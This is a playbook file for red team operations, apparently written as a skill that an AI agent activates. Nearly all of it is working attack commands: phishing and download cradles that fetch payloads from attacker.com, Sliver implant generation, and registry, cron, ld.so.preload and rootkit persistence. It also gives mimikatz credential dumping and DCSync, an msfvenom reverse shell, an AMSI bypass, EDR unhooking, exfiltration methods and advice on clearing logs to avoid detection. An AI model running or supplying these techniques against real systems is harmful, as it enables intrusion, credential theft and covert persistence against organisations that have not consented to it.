---
name: red-team-ops
description: Full red team engagement — initial access, persistence, privilege escalation, defense evasion, C2 infrastructure, EDR bypass, living-off-the-land
metadata:
  type: offensive
  phase: post-exploitation
  tools: cobalt-strike, sliver, havoc, mythic, covenant, msfconsole, powershell-empire
---

# Red Team Operations

## When to Activate

- Simulating advanced persistent threat (APT) operations
- Testing detection and response capabilities
- Establishing persistent access and C2
- Evading EDR/AV/SIEM detection
- Privilege escalation on compromised hosts
- Data exfiltration planning

## Initial Access

### Phishing Payloads
```bash
# Office macro (VBA)
# - AutoOpen/Document_Open trigger
# - Download cradle: PowerShell IEX or certutil
# - Sandbox evasion: check domain join, user interaction delay

# HTA (HTML Application)
mshta http://attacker.com/payload.hta

# ISO/IMG mounting (bypass MOTW)
# Package LNK + DLL inside ISO → double-click mounts, LNK executes DLL

# OneNote (.one) with embedded scripts
# Drag-and-drop .bat/.hta behind fake "Double click to view" image

# DLL sideloading
# Find legitimate signed EXE that loads DLL from CWD
# Place malicious DLL alongside legitimate EXE in delivery package
```

### Delivery Mechanisms
```
# Smuggling past email gateways:
# - Password-protected ZIP (password in email body)
# - HTML smuggling (JS constructs blob → downloads file)
# - QR code to attacker-controlled site
# - Legitimate file-sharing (OneDrive, Google Drive links)
```

## Command & Control (C2)

### Infrastructure Setup
```bash
# Sliver C2
sliver-server
> generate --mtls attacker.com --os windows --arch amd64 --format exe --save implant.exe
> mtls --lhost 0.0.0.0 --lport 443
> https --lhost 0.0.0.0 --lport 8443 --domain legit-looking.com

# Domain fronting / CDN hiding
# Use high-reputation domains (cloudfront, azure CDN)
# C2 traffic appears as legitimate HTTPS to CDN

# Redirectors
# socat TCP-LISTEN:443,fork TCP:c2-server:443
# Apache mod_rewrite rules to filter blue team probes

# Malleable C2 profiles (Cobalt Strike)
# Mimic legitimate traffic patterns (Slack, Teams, O365)
```

### C2 Communication Patterns
```
# DNS over HTTPS (DoH) — blends with normal traffic
# Domain fronting — SNI vs Host header mismatch
# Named pipes — internal lateral movement without network traffic
# SMB beacons — blend with normal AD traffic
# Websockets — persistent connection through proxies
```

## Persistence

### Windows
```powershell
# Registry Run keys
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /d "C:\path\payload.exe"

# Scheduled Tasks
schtasks /create /tn "SystemUpdate" /tr "C:\path\payload.exe" /sc onlogon /ru SYSTEM

# WMI Event Subscription (fileless)
# __EventFilter + __EventConsumer + __FilterToConsumerBinding

# DLL Search Order Hijacking
# Place malicious DLL in application directory (loaded before System32)

# COM Object Hijacking
# Modify CLSID InprocServer32 to point to malicious DLL

# Golden Ticket (domain-level persistence)
# With krbtgt hash, generate tickets for any user indefinitely

# DSRM (Directory Services Restore Mode)
# Modify DSRM password → backdoor DC even if krbtgt rotated

# Skeleton Key (in-memory DC patch)
mimikatz "privilege::debug" "misc::skeleton"
# Any user can now auth with password "mimikatz"
```

### Linux
```bash
# SSH authorized_keys
echo "ssh-rsa AAAA... attacker" >> ~/.ssh/authorized_keys

# Cron job
echo "* * * * * /tmp/.backdoor" | crontab -

# Systemd service
# /etc/systemd/system/update.service → ExecStart=/path/payload

# LD_PRELOAD
echo "/path/malicious.so" > /etc/ld.so.preload

# PAM backdoor
# Modify pam_unix.so to accept hardcoded password

# Kernel module (rootkit)
insmod rootkit.ko
```

## Privilege Escalation

### Windows
```powershell
# Token impersonation (SeImpersonatePrivilege)
# Potato family: JuicyPotato, PrintSpoofer, GodPotato, SweetPotato
PrintSpoofer.exe -i -c "cmd /c whoami"

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Weak service permissions
# sc qc ServiceName → check SERVICE_CHANGE_CONFIG
# Replace binary or modify binpath

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi > shell.msi

# Credential harvesting
mimikatz "privilege::debug" "sekurlsa::logonpasswords"
mimikatz "lsadump::sam"
mimikatz "lsadump::dcsync /user:Administrator"
```

### Linux
```bash
# SUID binaries
find / -perm -4000 -type f 2>/dev/null
# GTFOBins for exploitation

# Sudo misconfigurations
sudo -l
# (ALL) NOPASSWD: /usr/bin/vim → :!sh

# Capabilities
getcap -r / 2>/dev/null
# cap_setuid+ep on python3 → python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'

# Kernel exploits
uname -r
# Search exploit-db for kernel version

# Writable /etc/passwd
echo 'root2:$(openssl passwd pass):0:0::/root:/bin/bash' >> /etc/passwd

# Docker escape
# Privileged container: mount host filesystem
# Docker socket exposed: create privileged container
```

## Defense Evasion

### EDR Bypass
```
# Unhooking ntdll.dll
# 1. Map fresh copy of ntdll from disk
# 2. Overwrite .text section of loaded ntdll with clean copy
# 3. Syscalls now bypass EDR hooks

# Direct/Indirect Syscalls
# Skip ntdll entirely — call syscall instruction directly
# Indirect: JMP to syscall;ret inside ntdll (avoids syscall-from-non-ntdll detection)

# ETW Patching
# Patch EtwEventWrite to ret immediately
# Blinds .NET/PowerShell logging

# AMSI Bypass
# Patch AmsiScanBuffer to return AMSI_RESULT_CLEAN
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Process injection techniques:
# - Early bird APC injection
# - Module stomping (overwrite legitimate DLL .text)
# - Thread pool injection
# - Phantom DLL hollowing
```

### Living Off the Land (LOLBins)
```powershell
# Download
certutil -urlcache -split -f http://attacker.com/payload.exe C:\temp\payload.exe
bitsadmin /transfer job /download /priority high http://attacker.com/payload.exe C:\temp\payload.exe
powershell IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')

# Execution
rundll32 payload.dll,EntryPoint
mshta javascript:a=GetObject("script:http://attacker.com/payload.sct")
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
wmic process call create "payload.exe"

# Lateral movement
wmic /node:TARGET process call create "cmd /c payload"
winrs -r:TARGET cmd
```

## Data Exfiltration

```bash
# DNS exfiltration (slow but stealthy)
# Encode data in subdomain queries: base64chunk.attacker.com

# HTTPS to legitimate services
# Upload to paste sites, cloud storage, code repos

# Steganography
# Hide data in images/documents

# Chunked transfer over time
# Mimic normal traffic patterns, respect business hours
```

## OPSEC Considerations

- Timestamp stomping on dropped files
- Clear event logs selectively (not wholesale — that's suspicious)
- Use legitimate admin tools when possible
- Match C2 beacon timing to normal traffic patterns
- Avoid scanning from compromised hosts (use pivot tools)
- Rotate infrastructure regularly
- Use separate infrastructure for different engagement phases
